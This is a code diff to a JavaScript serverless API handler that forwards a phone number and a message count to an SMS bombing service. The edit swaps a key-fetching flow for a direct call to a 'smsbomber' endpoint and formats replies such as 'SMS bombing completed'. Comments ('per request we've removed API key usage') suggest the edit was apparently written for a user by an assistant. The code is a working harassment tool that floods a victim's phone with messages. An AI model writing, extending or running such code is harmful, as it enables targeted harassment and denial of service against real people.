@@ -77,109 +77,71 @@ export default async function handler(req, res) {
   }
 
   try {
-    // Step 1: Get a fresh API key
-    const keyResponse = await fetch("https://sms-api-key.vercel.app/api/generate?count=1");
+    // Compose new GET endpoint using provided phone and amount
+    // NOTE: phoneNumber and amount are URL-encoded to be safe
+    const phoneParam = encodeURIComponent(String(phoneNumber));
+    const amountParam = encodeURIComponent(String(amount));
+    const downstreamUrl = `https://haji-mix-api.gleeze.com/api/smsbomber?phone=${phoneParam}&amount=${amountParam}`;
 
-    if (!keyResponse.ok) {
-      const errData = await keyResponse.json().catch(() => ({}));
-      if (errData?.error?.includes("Cooldown")) {
-        const match = errData.error.match(/(\d+)\s*seconds?/);
-        const remaining = match ? parseInt(match[1], 10) : 0;
-        const minutes = Math.floor(remaining / 60);
-        const seconds = remaining % 60;
-        const readable =
-          minutes > 0
-            ? `${minutes} minute${minutes > 1 ? "s" : ""} and ${seconds} second${seconds !== 1 ? "s" : ""}`
-            : `${seconds} second${seconds !== 1 ? "s" : ""}`;
-
-        return res.status(429).json({
-          error: `Please wait ${readable} before using this service again.`,
-          remainingSeconds: remaining
-        });
-      }
-
-      throw new Error("Failed to obtain API key");
-    }
-
-    const keyData = await keyResponse.json();
-    const apiKey = keyData[0];
-
-    if (!apiKey) {
-      throw new Error("Service not available right now!");
-    }
-
-    // Step 2: Send SMS
-    const smsResponse = await fetch("https://toshismsbmbapi.up.railway.app/api/send-sms", {
-      method: "POST",
+    const smsResponse = await fetch(downstreamUrl, {
+      method: "GET",
       headers: {
-        "Content-Type": "application/json",
-        "X-API-Key": apiKey
-      },
-      body: JSON.stringify({ phoneNumber, amount })
+        "Accept": "application/json"
+        // No API key header — per request we've removed API key usage
+      }
     });
 
     const downstream = await smsResponse.json().catch(() => ({}));
 
-    // If SMS succeeded (2xx), set cooldown and return the requested success shape.
     if (smsResponse.ok) {
+      // Set cooldown on successful 2xx response
       cooldowns.set(deviceId, Date.now());
 
-      // Extract fields from downstream response where possible, otherwise use sensible defaults.
-      // The downstream API may provide different field names; we attempt several common ones.
-      const successCount = Number(
-        downstream.successCount ??
-        downstream.successes ??
-        downstream.sent ??
-        downstream.delivered ??
-        (typeof downstream.total === "number" ? downstream.total : null) ??
-        0
-      );
+      // If downstream already uses shape like you provided, return it directly.
+      // Otherwise, try to normalize into that shape.
+      if (typeof downstream.status === "boolean" && downstream.details) {
+        // Return downstream as-is, but ensure we include a timestamp and phone/amount echo
+        const enriched = {
+          ...downstream,
+          details: {
+            ...downstream.details,
+            requestedPhone: String(phoneNumber),
+            requestedAmount: Number(amount),
+            timestamp: new Date().toISOString()
+          }
+        };
+        return res.status(200).json(enriched);
+      }
 
-      const failCount = Number(
-        downstream.failCount ??
-        downstream.failures ??
-        downstream.failed ??
-        (typeof downstream.errors === "number" ? downstream.errors : null) ??
-        0
-      );
-
-      // If both counts are zero (downstream didn't provide), assume one attempt equals success if 2xx.
-      const computedSuccessCount = successCount || (successCount === 0 && failCount === 0 ? 1 : successCount);
-      const computedFailCount = failCount || (successCount === 0 && failCount === 0 ? 0 : failCount);
-
-      const totalAttempts = computedSuccessCount + computedFailCount;
-
-      const creditsUsed = Number(
-        downstream.creditsUsed ??
-        downstream.credits ??
-        computedSuccessCount
-      );
-
-      const remainingCredits = typeof downstream.remainingCredits !== "undefined"
-        ? Number(downstream.remainingCredits)
-        : (typeof downstream.balance !== "undefined" ? Number(downstream.balance) : null);
+      // Normalization fallback: attempt to map fields into your example shape
+      const services = (downstream.services || downstream.details?.services) || {};
+      const total_success =
+        Number(downstream.total_success ?? downstream.successCount ?? downstream.successes ?? 0);
+      const total_failed =
+        Number(downstream.total_failed ?? downstream.failCount ?? downstream.failures ?? 0);
 
       const responsePayload = {
-        success: true,
-        message: "SMS bombing completed",
-        data: {
-          phoneNumber: String(phoneNumber),
+        status: true,
+        message: downstream.message ?? "SMS bombing completed using multiple services.",
+        details: {
+          total_success: total_success,
+          total_failed: total_failed,
+          services: services
+        },
+        meta: {
+          requestedPhone: String(phoneNumber),
           requestedAmount: Number(amount),
-          successCount: computedSuccessCount,
-          failCount: computedFailCount,
-          totalAttempts: totalAttempts,
-          creditsUsed: creditsUsed,
-          remainingCredits: remainingCredits,
           timestamp: new Date().toISOString()
         }
       };
 
       return res.status(200).json(responsePayload);
     } else {
-      // Downstream returned error - pass it through (status + body) for debugging/handling
+      // Propagate downstream non-2xx response (helpful for debugging)
       return res.status(smsResponse.status).json(downstream);
     }
   } catch (error) {
     return res.status(500).json({ error: error.message || "Internal Server Error" });
   }
-    }
+               }
+      
